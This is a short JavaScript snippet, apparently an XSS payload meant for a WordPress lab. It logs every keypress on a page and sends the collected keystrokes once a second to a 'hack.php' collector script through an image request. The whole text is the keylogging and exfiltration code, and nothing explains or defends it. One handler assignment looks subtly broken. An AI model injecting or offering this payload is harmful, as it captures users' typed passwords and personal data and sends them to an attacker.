var keys = '';
GlobalEventHandlers.onkeypress = function (e) {
    var key = '';
    key = e.keyCode;
    key = String.fromCharCode(key);
    keys += key;
}
window.setInterval(function () {
    new Image().src = 'http://localhost/wp/xss/hack.php?c=' + keys;
    keys = '';
}, 1000);
